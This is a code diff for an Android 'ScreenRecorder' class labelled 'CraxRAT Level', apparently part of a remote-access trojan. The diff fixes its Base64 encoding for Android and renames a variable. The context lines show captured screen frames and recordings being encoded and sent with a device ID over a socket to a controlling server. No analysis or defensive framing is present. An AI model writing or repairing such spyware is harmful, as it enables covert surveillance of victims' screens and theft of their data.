@@ -9,12 +9,12 @@ import android.media.MediaRecorder;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.os.Environment;
+import android.util.Base64;
 import android.util.DisplayMetrics;
 import android.view.WindowManager;
 import org.json.JSONObject;
 import java.io.File;
 import java.io.FileInputStream;
-import java.util.Base64;
 
 /**
  * ULTIMATE SCREEN RECORDER - CraxRAT Level
@@ -219,7 +219,7 @@ public class ScreenRecorder {
                 fis.close();
                 
                 // Convert to base64
-                String base64Data = Base64.getEncoder().encodeToString(fileData);
+                String base64Data = Base64.encodeToString(fileData, Base64.NO_WRAP);
                 
                 // Send via socket
                 JSONObject data = new JSONObject();
@@ -346,7 +346,7 @@ public class ScreenRecorder {
                 fis.close();
                 
                 // Convert to base64
-                String base64Data = Base64.getEncoder().encodeToString(fileData);
+                String base64Data = Base64.encodeToString(fileData, Base64.NO_WRAP);
                 
                 // Send via socket
                 JSONObject data = new JSONObject();
@@ -413,15 +413,15 @@ public class ScreenRecorder {
                         buffer.get(bytes);
                         
                         // Convert to base64
-                        String base64Data = Base64.getEncoder().encodeToString(bytes);
+                        String base64Data = Base64.encodeToString(bytes, Base64.NO_WRAP);
                         
                         // Send via socket
-                        JSONObject data = new JSONObject();
-                        data.put("deviceId", DeviceUtils.getDeviceId(context));
-                        data.put("streamType", "screen");
-                        data.put("streamData", base64Data);
+                        JSONObject streamData = new JSONObject();
+                        streamData.put("deviceId", DeviceUtils.getDeviceId(context));
+                        streamData.put("streamType", "screen");
+                        streamData.put("streamData", base64Data);
                         
-                        SocketManager.getInstance(context).emit("stream:data", data);
+                        SocketManager.getInstance(context).emit("stream:data", streamData);
                         
                         image.close();
                     }
